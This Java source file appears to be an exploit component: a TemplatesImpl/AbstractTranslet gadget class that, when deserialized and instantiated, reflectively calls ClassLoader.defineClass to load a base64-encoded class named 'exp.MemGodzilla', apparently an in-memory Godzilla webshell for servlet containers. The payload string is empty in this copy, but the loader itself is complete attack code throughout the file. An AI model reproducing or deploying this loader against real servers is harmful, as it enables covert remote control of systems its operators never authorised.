package exp;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import sun.misc.BASE64Decoder;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.lang.reflect.Field;
import java.lang.reflect.Modifier;
import java.math.BigInteger;
import java.security.MessageDigest;
import java.util.EnumSet;

public class TemplatesImplMemGodzilla  extends AbstractTranslet  {
	public String classname ;
	public String classbase64 ;
    
	
    public void setAll()  {
    	this.classname = "exp.MemGodzilla";
    	this.classbase64 = "";
    }
	
    public TemplatesImplMemGodzilla() throws Exception {
    	setAll();
    	try {
    		Class.forName(classname).newInstance();
		} catch (Exception e) {
	    	java.lang.reflect.Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", String.class, byte[].class, int.class, int.class);
	        defineClass.setAccessible(true);
			byte [] bs = base64_decode(classbase64);
	        Class clazz = (Class)defineClass.invoke(Thread.currentThread().getContextClassLoader(), classname, bs, 0, bs.length);
	        Object obj = clazz.newInstance();
		}
    }
    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) {
    }
    @Override
    public void transform(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers) throws TransletException {
    }
	
    public static byte[] base64_decode(String string) throws Exception {
    	byte[] bytes;
		try {
			try {
				Object decoder = Class.forName("java.util.Base64").getMethod("getDecoder").invoke(null);
				bytes = (byte[]) Class.forName("java.util.Base64$Decoder").getMethod("decode",String.class).invoke(decoder, string);
			} catch (Exception e) {
				Object decoder = Class.forName("java.util.Base64").getMethod("getMimeDecoder").invoke(null);
				bytes = (byte[]) Class.forName("java.util.Base64$Decoder").getMethod("decode",String.class).invoke(decoder, string);
			}
		} catch (Exception e) {
			bytes = (byte[]) Class.forName("sun.misc.BASE64Decoder").getMethod("decodeBuffer",String.class).invoke(Class.forName("sun.misc.BASE64Decoder").newInstance(), string);
		}
		return bytes;
	}
}

